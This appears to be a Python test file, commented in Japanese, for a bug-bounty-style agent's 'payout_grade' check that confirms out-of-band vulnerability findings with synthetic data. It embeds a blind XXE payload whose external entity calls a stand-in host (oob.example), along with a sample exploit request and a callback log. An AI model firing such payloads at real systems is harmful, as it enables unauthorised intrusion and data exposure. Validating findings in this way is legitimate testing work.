"""SGK-2026-0494: OOB(帯域外)確認の機械フロア（payout_grade）汎用発火と fail-closed を
検証する。vuln_type 横断（xxe/ssrf/sqli 等）で「我々の一意 token をペイロードに埋めて送り、
標的が我々の受信器へその token でコールバックした」ことを確認する。製品非依存（合成データ）。"""

from src.core.agents.swarm.injection.payout_grade import evaluate_payout_grade

_URL = "https://target.example/home"
_TOKEN = "shigokuoobdeadbeef"
_CB = f"http://oob.example/callback/{_TOKEN}"
_PAYLOAD = f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{_CB}">]><items>&x;</items>'
_POC_REQ = f"POST {_URL} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nxxe={_PAYLOAD}"
_POC_RES = (
    "HTTP/1.1 200\r\n\r\n(blind)\r\n"
    f"GET /callback/{_TOKEN} HTTP/1.1 (source 10.0.0.9)"
)


def _finding(vuln_type="xxe", **oob_over):
    oob = {
        "vuln_class": vuln_type, "channel": "http", "token": _TOKEN,
        "callback_url": _CB, "payload": _PAYLOAD, "interaction_received": True,
        "interaction": {"token": _TOKEN, "path": f"/callback/{_TOKEN}", "remote_ip": "10.0.0.9"},
        "request_status": 200,
    }
    oob.update(oob_over)
    return {
        "vuln_type": vuln_type,
        "impact": "外部実体が我々の受信器を fetch＝ブラインド XXE。",
        "reproduction_steps": ["一意 callback を発行→外部実体で送信→受信器に token 到達を確認。"],
        "evidence": {
            "request_method": "POST", "request_url": _URL,
            "response_status": 200, "response_body": "",
        },
        "additional_info": {
            "oob_evidence": oob,
            "unique_oob_callback_received": True,
            "poc_request": _POC_REQ,
            "poc_response": _POC_RES,
        },
    }


def test_fires_generic_oob_for_xxe():
    r = evaluate_payout_grade(_finding("xxe"))
    assert r.payout_grade is True
    assert r.marker == "oob_interaction_received"


def test_fires_generic_oob_for_ssrf():
    # OOB は vuln_type 横断（ssrf も既知カテゴリなので発火経路に乗る）。
    r = evaluate_payout_grade(_finding("ssrf"))
    assert r.payout_grade is True
    assert r.marker == "oob_interaction_received"


def test_fail_closed_not_received():
    r = evaluate_payout_grade(_finding("xxe", interaction_received=False))
    assert r.payout_grade is False


def test_fail_closed_token_not_in_payload():
    # token が payload に無い＝我々が送った証明がない → 発火しない。
    r = evaluate_payout_grade(_finding("xxe", payload="<x/>"))
    assert r.payout_grade is False


def test_fail_closed_token_not_in_callback_path():
    r = evaluate_payout_grade(_finding("xxe", interaction={"path": "/callback/OTHER", "remote_ip": "1.1.1.1"}))
    assert r.payout_grade is False


def test_fail_closed_empty_token():
    r = evaluate_payout_grade(_finding("xxe", token=""))
    assert r.payout_grade is False
